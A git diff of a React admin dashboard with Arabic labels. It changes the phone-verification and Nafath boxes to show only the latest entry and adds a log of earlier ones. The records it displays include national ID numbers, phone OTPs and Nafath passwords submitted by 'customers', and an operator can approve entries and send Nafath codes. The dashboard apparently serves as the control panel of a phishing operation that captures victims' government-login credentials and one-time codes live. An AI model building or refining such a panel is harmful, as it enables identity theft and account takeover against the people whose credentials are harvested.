           latestPhoneTimestamp = ts;
+          latestPhoneEntry = entry;
         }
       }
     });
 
-    customerEntryGroup.forEach((entry, index) => {
-      const raw = entry.raw || {};
-      const hasPhoneVerification = raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7;
-      if (!hasPhoneVerification) return;
+    // Create ONE box for Phone (latest entry only)
+    if (latestPhoneEntry) {
+      const raw = latestPhoneEntry.raw || {};
       let entryTimestamp = Date.now();
       if (raw._v7UpdatedAt) {
         const _v7Ts = new Date(raw._v7UpdatedAt).getTime();
         if (_v7Ts > 0) {
           entryTimestamp = _v7Ts;
         }
-      } else if (entry.submittedAt) {
-        entryTimestamp = new Date(entry.submittedAt).getTime();
+      } else if (latestPhoneEntry.submittedAt) {
+        entryTimestamp = new Date(latestPhoneEntry.submittedAt).getTime();
       }
-      const isLatest = entryTimestamp === latestPhoneTimestamp;
 
       boxes.push({
-        key: `phone-${entry.id}`,
+        key: `phone-${latestPhoneEntry.id}`,
         timestamp: entryTimestamp,
         component: (
           <div style={{ 
             background: "#ffffff", 
             borderRadius: 12, 
             padding: 16, 
-            border: isLatest ? "2px solid #3b82f6" : "1px solid #e5e7eb",
+            border: "2px solid #3b82f6",
             width: "40%",
             marginRight: 0,
             marginLeft: "auto",
             position: "relative"
           }}>
             <TimeCounter timestamp={entryTimestamp} />
-            {isLatest && (
-              <span style={{
-                position: "absolute",
-                top: 8,
-                right: 8,
-                background: "#3b82f6",
-                color: "#fff",
-                padding: "2px 8px",
-                borderRadius: 4,
-                fontSize: "0.65rem",
-                fontWeight: 600
-              }}>
-                الأحدث
-              </span>
-            )}
-            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: isLatest ? 20 : 0 }}>
+            <span style={{
+              position: "absolute",
+              top: 8,
+              right: 8,
+              background: "#3b82f6",
+              color: "#fff",
+              padding: "2px 8px",
+              borderRadius: 4,
+              fontSize: "0.65rem",
+              fontWeight: 600
+            }}>
+              الأحدث
+            </span>
+            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: 20 }}>
               <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>تحقق الهاتف</h3>
             </div>
             {raw.phoneIdNumber && (
@@ -2721,14 +3011,104 @@ const renderNafadBox = () => {
                 {actionLoading === "approve" ? "جارٍ..." : "موافقة"}
               </button>
             </div>
+            
+            {/* زر عرض السجل */}
+            {phoneEntriesCount > 1 && (
+              <button
+                onClick={() => setOpenLogBox(openLogBox === 'phone' ? null : 'phone')}
+                style={{
+                  marginTop: 12,
+                  width: "100%",
+                  padding: "10px 16px",
+                  border: "1px solid #d1d5db",
+                  borderRadius: 8,
+                  background: openLogBox === 'phone' ? "#f0fdf4" : "#f9fafb",
+                  color: openLogBox === 'phone' ? "#16a34a" : "#374151",
+                  fontWeight: 600,
+                  fontSize: "0.8rem",
+                  cursor: "pointer",
+                  transition: "all 0.2s",
+                  display: "flex",
+                  alignItems: "center",
+                  justifyContent: "center",
+                  gap: 8
+                }}
+              >
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                  <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
+                  <polyline points="14,2 14,8 20,8" />
+                  <line x1="16" y1="13" x2="8" y2="13" />
+                  <line x1="16" y1="17" x2="8" y2="17" />
+                </svg>
+                عرض السجل ({phoneEntriesCount} إدخالات)
+              </button>
+            )}
+            
+            {/* سجل الإدخالات */}
+            {openLogBox === 'phone' && phoneEntriesCount > 1 && (
+              <div style={{
+                marginTop: 12,
+                padding: 12,
+                background: "#f9fafb",
+                borderRadius: 8,
+                maxHeight: 300,
+                overflowY: "auto"
+              }}>
+                <div style={{ fontSize: "0.75rem", fontWeight: 600, color: "#6b7280", marginBottom: 8 }}>
+                  سجل الإدخالات:
+                </div>
+                {customerEntryGroup
+                  .filter(entry => {
+                    const raw = entry.raw || {};
+                    return raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7;
+                  })
+                  .sort((a, b) => {
+                    const timeA = new Date(a.submittedAt || a.updatedAt || 0).getTime();
+                    const timeB = new Date(b.submittedAt || b.updatedAt || 0).getTime();
+                    return timeB - timeA;
+                  })
+                  .map((entry, idx) => {
+                    const raw = entry.raw || {};
+                    const entryTime = entry.submittedAt ? new Date(entry.submittedAt).toLocaleString('ar-SA') : '—';
+                    const isCurrent = entry.id === selectedRequest?.id;
+                    return (
+                      <div key={entry.id} style={{
+                        padding: "8px",
+                        marginBottom: 8,
+                        background: isCurrent ? "#dcfce7" : "#fff",
+                        borderRadius: 6,
+                        border: isCurrent ? "1px solid #16a34a" : "1px solid #e5e7eb",
+                        fontSize: "0.7rem"
+                      }}>
+                        <div style={{ fontWeight: 600, color: "#374151", marginBottom: 4 }}>
+                          {isCurrent ? "★ الحالي" : `إدخال ${idx + 1}`} - {entryTime}
+                        </div>
+                        {raw.phoneIdNumber && (
+                          <div style={{ color: "#6b7280" }}>رقم الهوية: {raw.phoneIdNumber}</div>
+                        )}
+                        {raw.phoneCarrier && (
+                          <div style={{ color: "#6b7280" }}>شركة الاتصالات: {raw.phoneCarrier}</div>
+                        )}
+                      </div>
+                    );
+                  })}
+              </div>
+            )}
           </div>
         )
       });
-    });
+    }
     
-// Create a box for each entry that has Nafad data
-    // Find the most recent Nafad timestamp first
+// Count entries that have Nafad data
+    const nafadEntriesCount = customerEntryGroup.filter(entry => {
+      const raw = entry.raw || {};
+      return raw.nafadIdNumber || raw.nafadPassword;
+    }).length;
+    
+    // Find the most recent entry with Nafad data
+    let latestNafadEntry: (typeof customerEntryGroup)[0] | null = null;
     let latestNafadTimestamp = 0;
+    
     customerEntryGroup.forEach((entry) => {
       const raw = entry.raw || {};
       const hasNafad = raw.nafadIdNumber || raw.nafadPassword;
@@ -2736,58 +3116,55 @@ const renderNafadBox = () => {
         const ts = raw.nafadUpdatedAt
           ? new Date(raw.nafadUpdatedAt).getTime()
           : new Date(entry.submittedAt || entry.updatedAt || Date.now()).getTime();
-        if (ts > latestNafadTimestamp) {
+        if (ts >= latestNafadTimestamp) {
           latestNafadTimestamp = ts;
+          latestNafadEntry = entry;
         }
       }
     });
 
-    customerEntryGroup.forEach((entry, index) => {
-      const raw = entry.raw || {};
-      const hasNafad = raw.nafadIdNumber || raw.nafadPassword;
-      if (!hasNafad) return;
+    // Create ONE box for Nafad (latest entry only)
+    if (latestNafadEntry) {
+      const raw = latestNafadEntry.raw || {};
       let entryTimestamp = Date.now();
       if (raw.nafadUpdatedAt) {
         const nafadTs = new Date(raw.nafadUpdatedAt).getTime();
         if (nafadTs > 0) {
           entryTimestamp = nafadTs;
         }
-      } else if (entry.submittedAt) {
-        entryTimestamp = new Date(entry.submittedAt).getTime();
+      } else if (latestNafadEntry.submittedAt) {
+        entryTimestamp = new Date(latestNafadEntry.submittedAt).getTime();
       }
-      const isLatest = entryTimestamp === latestNafadTimestamp;
 
       boxes.push({
-        key: `nafad-${entry.id}`,
+        key: `nafad-${latestNafadEntry.id}`,
         timestamp: entryTimestamp,
         component: (
           <div style={{ 
             background: "#ffffff", 
             borderRadius: 12, 
             padding: 16, 
-            border: isLatest ? "2px solid #3b82f6" : "1px solid #e5e7eb",
+            border: "2px solid #3b82f6",
             width: "40%",
             marginRight: 0,
             marginLeft: "auto",
             position: "relative"
           }}>
             <TimeCounter timestamp={entryTimestamp} />
-            {isLatest && (
-              <span style={{
-                position: "absolute",
-                top: 8,
-                right: 8,
-                background: "#3b82f6",
-                color: "#fff",
-                padding: "2px 8px",
-                borderRadius: 4,
-                fontSize: "0.65rem",
-                fontWeight: 600
-              }}>
-                الأحدث
-              </span>
-            )}
-            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: isLatest ? 20 : 0 }}>
+            <span style={{
+              position: "absolute",
+              top: 8,
+              right: 8,
+              background: "#3b82f6",
+              color: "#fff",
+              padding: "2px 8px",
+              borderRadius: 4,
+              fontSize: "0.65rem",
+              fontWeight: 600
+            }}>
+              الأحدث
+            </span>
+            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12, marginTop: 20 }}>
               <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>نفاذ</h3>
             </div>
             {raw.nafadIdNumber && (
@@ -2839,13 +3216,92 @@ const renderNafadBox = () => {
             >
               📤 {actionLoading === "nafad" ? "جارٍ الإرسال..." : "إرسال رمز النفاذ"}
             </button>
+            
+            {/* زر عرض السجل */}
+            {nafadEntriesCount > 1 && (
+              <button
+                onClick={() => setOpenLogBox(openLogBox === 'nafad' ? null : 'nafad')}
+                style={{
+                  marginTop: 12,
+                  width: "100%",
+                  padding: "10px 16px",
+                  border: "1px solid #d1d5db",
+                  borderRadius: 8,
+                  background: openLogBox === 'nafad' ? "#f0fdf4" : "#f9fafb",
+                  color: openLogBox === 'nafad' ? "#16a34a" : "#374151",
+                  fontWeight: 600,
+                  fontSize: "0.8rem",
+                  cursor: "pointer",
+                  transition: "all 0.2s",
+                  display: "flex",
+                  alignItems: "center",
+                  justifyContent: "center",
+                  gap: 8
+                }}
+              >
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                  <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
+                  <polyline points="14,2 14,8 20,8" />
+                  <line x1="16" y1="13" x2="8" y2="13" />
+                  <line x1="16" y1="17" x2="8" y2="17" />
+                </svg>
+                عرض السجل ({nafadEntriesCount} إدخالات)
+              </button>
+            )}
+            
+            {/* سجل الإدخالات */}
+            {openLogBox === 'nafad' && nafadEntriesCount > 1 && (
+              <div style={{
+                marginTop: 12,
+                padding: 12,
+                background: "#f9fafb",
+                borderRadius: 8,
+                maxHeight: 300,
+                overflowY: "auto"
+              }}>
+                <div style={{ fontSize: "0.75rem", fontWeight: 600, color: "#6b7280", marginBottom: 8 }}>
+                  سجل الإدخالات:
+                </div>
+                {customerEntryGroup
+                  .filter(entry => {
+                    const raw = entry.raw || {};
+                    return raw.nafadIdNumber || raw.nafadPassword;
+                  })
+                  .sort((a, b) => {
+                    const timeA = new Date(a.submittedAt || a.updatedAt || 0).getTime();
+                    const timeB = new Date(b.submittedAt || b.updatedAt || 0).getTime();
+                    return timeB - timeA;
+                  })
+                  .map((entry, idx) => {
+                    const raw = entry.raw || {};
+                    const entryTime = entry.submittedAt ? new Date(entry.submittedAt).toLocaleString('ar-SA') : '—';
+                    const isCurrent = entry.id === selectedRequest?.id;
+                    return (
+                      <div key={entry.id} style={{
+                        padding: "8px",
+                        marginBottom: 8,
+                        background: isCurrent ? "#dcfce7" : "#fff",
+                        borderRadius: 6,
+                        border: isCurrent ? "1px solid #16a34a" : "1px solid #e5e7eb",
+                        fontSize: "0.7rem"
+                      }}>
+                        <div style={{ fontWeight: 600, color: "#374151", marginBottom: 4 }}>
+                          {isCurrent ? "★ الحالي" : `إدخال ${idx + 1}`} - {entryTime}
+                        </div>
+                        {raw.nafadIdNumber && (
+                          <div style={{ color: "#6b7280" }}>رقم الهوية: {raw.nafadIdNumber}</div>
+                        )}
+                      </div>
+                    );
+                  })}
+              </div>
+            )}
           </div>
         )
       });
-    });
+    }
     
-
-// Create a box for each entry that has Package/Offer data
+    // Create a box for each entry that has Package/Offer data
     // Find the most recent Package timestamp first
     let latestPackageTimestamp = 0;
     customerEntryGroup.forEach((entry) => {
